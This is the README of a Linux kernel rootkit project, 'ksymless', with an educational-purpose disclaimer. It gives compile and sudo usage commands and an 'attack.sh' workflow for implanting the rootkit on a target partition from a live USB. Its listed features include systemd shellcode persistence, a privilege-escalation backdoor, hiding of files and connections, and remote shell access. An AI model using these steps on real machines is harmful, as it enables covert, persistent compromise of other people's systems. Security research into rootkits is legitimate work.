# ksymless

This is a kernel rootkit that works without kallsyms and kprobe support. It aims at linux v6.11+ kernel versions with x86-64 architecture. All the features will be tested on ubuntu 24.04 and some other experiment environments.

## Claim
This rootkit is for **Educational Purpose**, do not use it to do anything illegally.

This rootkit will potentially cause **IRREVERSIBLE DAMAGE** to your system, please run it in experiment environment.

## Why not kallsyms?
The `kallsyms` can be removed while compiling the kernel, it is not a good thing to depend on it. By the way, the symbol searching of `kprobe` is also implemented by `kallsyms`, so it is not allowed to be used in this repository.
## Compilation
### Install Dependency
```
sudo apt install linux-headers-`uname -r`
```

### Compile
```
git clone https://github.com/rota1001/kernel-rootkit.git
cd kernel-rootkit
make
```
## Usage
Please read the **Claim** before you do it.

If you know what you are doing, use `sudo` to execute this program. Your `systemd` will be patched, and the rootkit will be automatically inserted everytime you boot your kernel.
The parameter is the path to the target root, and all the path setting in the program will be relative to this path. For example, if the rootfs is stored on a partition, you can mount it on a directory and pass the absolute path of that partition as the parameter to run this program.
```
sudo ./user [absolute path to target root]
```

You can use the shell script `create-usb.sh` to create a minimal USB.
```
./create-usb.sh
```

You can use the shell script `attack.sh` to implant the rootkit on the target partition. This can be run in the Live USB created above, and will be placed at the root directory defaultly.
```
./attack.sh
```

## Features
- 🔍 Resolve Syscalls without Kallsyms
- 📁 Resolve procfs operations by path
- 💉 Persistence: Inject shellcode into `systemd`
- 🧩 Function Hooking without ftrace
- 💽 Create a minimal Live USB with one click
- 🚪 Privilege Escalation Backdoor
- 🖥️  User Interface for implanting rootkit
- 🕵️ Hiding modules / files / network connections
- 💻 Remote Shell Access

## Reference
- [drow](https://github.com/zznop/drow): static code ELF injection
- [rooty](https://github.com/jermeyyy/rooty): Hook with writing shellcode
- [caraxes](https://github.com/ait-aecid/caraxes): Syscall hooking in newer versions
- [linux_kernel_hacking](https://github.com/xcellerator/linux_kernel_hacking): port hiding / kernel module loading
- [awesome-linux-rootkits](https://github.com/milabs/awesome-linux-rootkits): List of awesome rootkits

